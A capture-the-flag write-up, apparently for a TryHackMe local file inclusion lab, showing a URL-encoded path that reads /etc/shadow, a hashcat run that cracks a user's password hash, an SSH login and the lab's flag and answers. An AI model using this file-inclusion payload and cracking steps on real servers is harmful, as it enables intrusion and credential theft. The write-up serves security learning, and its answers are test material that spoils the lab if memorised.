# LFI

```
cracking password of a server to access private notes.
```

## Notes

```
export IP=10.10.13.38
/get-file/%2fetc%2fshadow to include /etc/shadow

```

## Questions

1. What is Charlie going to book a holiday to?

```
Note 3
Hawaii
```

2. Read /etc/shadow and crack Charlies password.

```
charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::

https://samsclass.info/123/proj10/p12-hashcat.htm follow this to crack using hashcat
hashcat -m 1800 -a 0 <hash> <wordlist>

RESULT:
$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:password1]uit =>

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0K...GOyhL.
Time.Started.....: Thu May 28 22:08:37 2020 (2 secs)
Time.Estimated...: Thu May 28 22:08:39 2020 (0 secs)
Guess.Base.......: File (../../../../../wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:     4344 H/s (8.87ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 6144/14344384 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Candidates.#1....: 123456 -> horoscope
HWMon.Dev.#1.....: Temp: 55c Util:100% Core:1733MHz Mem:3504MHz Bus:16

password1
```

3. What is flag1.txt?

```
nmap
ssh using charlie:password1
cat flag1.txt

THM{4ea2adf842713ad3ce0c1f05ef12256d}

```
